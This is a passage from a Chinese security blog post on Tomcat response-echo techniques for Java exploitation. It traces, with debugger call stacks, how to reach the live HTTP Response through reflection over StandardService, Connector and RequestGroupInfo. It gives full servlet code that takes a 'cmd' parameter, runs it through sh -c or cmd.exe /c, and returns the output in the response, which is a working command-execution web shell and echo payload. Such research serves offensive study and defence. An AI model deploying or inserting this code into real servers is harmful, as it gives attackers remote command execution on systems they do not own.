&amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 根据操作系统类型设置命令执行方式</span></span><br><span class="line">                String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;:<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;;</span><br><span class="line">                <span class="comment">// 执行命令并获取输入流</span></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="comment">// 将命令执行结果写入响应</span></span><br><span class="line">                servletResponse.getWriter().write(output);</span><br><span class="line">                servletResponse.getWriter().flush();</span><br><span class="line">                servletResponse.getWriter().close();</span><br><span class="line"></span><br><span class="line">        &#125; &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/image-20240730182034569.png" alt="image-20240730182034569"></p>
<h3 id="回显报错（getWriter重复使用报错）"><a href="#回显报错（getWriter重复使用报错）" class="headerlink" title="回显报错（getWriter重复使用报错）"></a>回显报错（getWriter重复使用报错）</h3><blockquote>
<p>别的师傅那看到的，自己并未遇到。如果遇到可以参考原文<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/30/Java-%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#getWriter%E9%87%8D%E5%A4%8D%E4%BD%BF%E7%94%A8%E6%8A%A5%E9%94%99">Java 回显技术 | Drunkbaby’s Blog (drun1baby.top)</a></p>
<p>在使用response的<code>getWriter</code>函数时，usingWriter 变量就会被设置为true。如果在一次请求中<code>usingWriter</code>变为了true那么在这次请求之后的结果输出时就会报错</p>
<p>报错内容如下，<code>getWriter</code>已经被调用过一次</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;java.lang.IllegalStateException: getWriter() has already been called <span class="keyword">for</span> <span class="built_in">this</span> response</span><br></pre></td></tr></table></figure>

<p>这时候有两种解决办法：</p>
<ul>
<li>在调用完一次<code>getWriter</code>反射修改usingWriter的值为false</li>
<li>使用<code>getOutputStream</code>代替</li>
</ul>
</blockquote>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在<code>ApplicationFilterChain#internalDoFilter</code>方法中，doFilter方法实际上是在我们获取response之前的。触发Shiro漏洞漏洞的时候，我们还未能将request和response储存到ThreadLocal中。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">        ...</span><br><span class="line">         filter.doFilter(request, response, <span class="built_in">this</span>);<span class="comment">//Shiro漏洞触发点</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (...)</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(request);</span><br><span class="line">        lastServicedResponse.set(response);<span class="comment">//Tomcat回显关键点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (...)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        servlet.service(request, response);<span class="comment">//servlet调用点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h2><p>Litch1师傅的一种思路。原文链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究 (qq.com)</a></p>
<p>在Java Web开发中，Servlet容器是核心组件，许多框架在其基础上做了不同程度的封装。这使得因为不同框架或不同版本的实现差异，很难找到一种通用的方法来获取回显信息。例如，上文使用 <code>ThreadLocal</code> 类在 Shiro 框架中获取回显的方法可能无效。</p>
<p>因此，我们或许可以从另一个角度入手，尝试在 Tomcat 中寻找全局存储的 <code>Request</code> 和 <code>Response</code> 对象。为了实现回显功能，这些 <code>Request</code> 和 <code>Response</code> 对象必须属于当前执行的线程。因此，关键在于找到当前代码运行的上下文与Tomcat的运行上下文之间的关联。</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们可以看一下调用栈，追踪response，我们可以找到<code>org.apache.catalina.connector.CoyoteAdapter</code>的<code>service</code>方法。当前response的hash值和我们在doGet方法中<code>HttpServletResponse</code>的response一样。</p>
<p><img src="/./images/image-20240731001151097.png" alt="image-20240731001151097"></p>
<p>而这个response来自于<code>org.apache.coyote.http11.Http11Processor</code>的<code>this.response</code>，经过一些setter和getter方法调整得来的。而<code>org.apache.coyote.http11.Http11Processor</code>的<code>this.response</code>其实并非是他本身的，而是来自<code>org.apache.coyote.AbstractProcessor</code>的<code>this.response</code>。</p>
<p><img src="/./images/image-20240731001918781.png" alt="image-20240731001918781"></p>
<p>调用堆栈如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">doGet:<span class="number">22</span>, Tomcat_Exec (cmisl)</span><br><span class="line">service:<span class="number">529</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">623</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">209</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">51</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">168</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">481</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">670</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">342</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">390</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">928</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1794</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">52</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">750</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>这时候已经有了request，response，接下来往前寻找有没有哪里存储了这个Processor？或者是哪里对于Processor的Request等信息进行了存储？可以发现在之前的调用链中的<code>AbstractProtocol</code>的内部类<code>ConnectionHandler</code>中在处理的时候就将当前的Processor(即后面的<code>Http11Processor</code>)的信息通过<code>register</code>方法存储在了global中。</p>
<p><img src="/./images/image-20240731005138154.png" alt="image-20240731005138154"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Processor processor)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getProtocol().getDomain() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> <span class="built_in">this</span>.registerCount.incrementAndGet(); </span><br><span class="line">                <span class="comment">//获取当前处理器的请求信息 RequestInfo 对象 rp。</span></span><br><span class="line">                <span class="type">RequestInfo</span> <span class="variable">rp</span> <span class="operator">=</span> processor.getRequest().getRequestProcessor();</span><br><span class="line">                <span class="comment">//将全局处理器设置到请求信息中。</span></span><br><span class="line">                rp.setGlobalProcessor(<span class="built_in">this</span>.global);</span><br><span class="line">                ......</span><br><span class="line">                &#125;</span><br><span class="line">			......</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123; </span><br><span class="line">            ......</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>详细来说，就是获取<code>Http11Processor</code>的Request的RequestInfo变量，而RequestInfo变量里又有Request本身，获取RequestInfo之后<code>rp.setGlobalProcessor(this.global)</code>方法里把这个RequestInfo添加到global这个变量里面。</p>
<p>那么我们获取了global就相当于获取了RequestInfo，通过RequestInfo又可以获取包含它的Request。那么Response又怎么获取呢？其实Response可以从Request中获取，因为在我们Http11Processor初始化的时候，就会在调用父类AbstractProcessor初始化函数过程中，把request设置了参数response。</p>
<p><img src="/./images/image-20240731011119226.png" alt="image-20240731011119226"></p>
<p>至此我们的调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure>

<p>现在我们的工作就是获取AbstractProtocol类或者继承AbstractProtocol的类，继续看调用链。在CoyoteAdapter类中，存在一个connector属性。我们来看Connector类的定义，存在和AbstractProtocol相关的<code>protocolHandler</code>属性，该属性的值为一个<code>Http11NioProtocol</code>对象，并且该类继承了AbstractProtocol类</p>
<p><img src="/./images/image-20240731013248652.png" alt="image-20240731013248652"></p>
<p>此时我们的调用链变成如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response</span><br></pre></td></tr></table></figure>

<p>下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector，并且调用addaddConnector方法存放在connectors中</p>
<p><img src="/./images/image-20240731013616522.png" alt="image-20240731013616522"></p>
<p><img src="/./images/image-20240731013844294.png" alt="image-20240731013844294"></p>
<p>那么现在的获取链变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardService --&gt; connectors --&gt; connector --&gt; protocolHandler --&gt; handler --&gt; AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<p>connectors同样为非静态属性，那么我们就需要获取在Tomcat中已经存在的StandardService对象，而不是新创建的对象。</p>
<h4 id="如何获取StandardService"><a href="#如何获取StandardService" class="headerlink" title="如何获取StandardService"></a>如何获取StandardService</h4><blockquote>
<p>Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况。</p>
<p>假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。</p>
<p>**那么如何破坏Java原有的类加载机制呢？如果上层的ClassLoader需要调用下层的ClassLoader怎么办呢？**就需要使用Thread Context ClassLoader，线程上下文类加载器。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器，如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。</p>
<p><strong>说了那么多，其实WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。</strong></p>
<p>我们debug看看Thread.currentThread().getContextClassLoader()里面都有啥东西，这里只要稍微搜寻一下就会发现有很多Tomcat有关的运行信息。我们只要寻找我们上文提到的需要的Service就可以了。</p>
<p><img src="/./images/image-20240731015933265.png" alt="image-20240731015933265"></p>
<p><strong>最后的路径：</strong></p>
<p><em>WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response。</em></p>
</blockquote>
<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span> <span class="comment">// 定义Servlet的访问路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取当前线程的上下文类加载器并转换为WebappClassLoaderBase</span></span><br><span class="line">            <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="comment">// 获取当前Web应用的标准上下文</span></span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射获取StandardContext中的ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">ApplicationContext_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            ApplicationContext_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) ApplicationContext_Field.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射获取ApplicationContext中的StandardService</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">StandardService_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            StandardService_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) StandardService_Field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射获取StandardService中的连接器数组</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectors_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectors_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors = (Connector[]) connectors_Field.get(standardService);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> connectors[<span class="number">0</span>]; <span class="comment">// 选择第一个连接器</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取连接器的协议处理器</span></span><br><span class="line">            <span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connector.getProtocolHandler();</span><br><span class="line">            <span class="comment">// 通过反射获取协议处理器中的处理器</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">handler_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            handler_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handler_Field.get(protocolHandler);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取全局的请求组信息</span></span><br><span class="line">            <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) handler.getGlobal();</span><br><span class="line">            <span class="comment">// 通过反射获取请求组信息中的请求处理器列表</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">processors_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            processors_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            List&lt;RequestInfo&gt; requestInfos = (List&lt;RequestInfo&gt;) processors_Field.get(global);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历请求处理器列表</span></span><br><span class="line">            <span class="keyword">for</span> (RequestInfo requestInfo : requestInfos) &#123;</span><br><span class="line">                <span class="comment">// 通过反射获取请求信息中的请求对象</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">req_Field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                req_Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                org.apache.coyote.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.coyote.Request) req_Field.get(requestInfo);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 尝试获取当前请求的request和response</span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">http_request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">http_response</span> <span class="operator">=</span> http_request.getResponse();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取请求参数&quot;cmd&quot;</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> http_request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                http_response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 判断操作系统类型</span></span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 根据操作系统类型设置命令执行方式</span></span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="comment">// 执行命令并获取输入流</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="comment">// 将命令执行结果写入响应</span></span><br><span class="line">                    http_response.getWriter().write(output);</span><br><span class="line">                    http_response.getWriter().flush();</span><br><span class="line">                    http_response.getWriter().close();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Tomcat版本问题"><a href="#Tomcat版本问题" class="headerlink" title="Tomcat版本问题"></a>Tomcat版本问题</h3><p>刚才在一开始获取Tomcat ClassLoader context提到这种方式只适用于Tomcat 8和9的低版本中，原因如下</p>
<p>可以看到高版本<code>WebappClassLoaderBase#getResources</code>方法，返回null。自然无法获取StandardService了。</p>
<p>高版本Tomcat 8和9</p>
<p><img src="/./images/image-20240731022101343.png" alt="image-20240731022101343"></p>
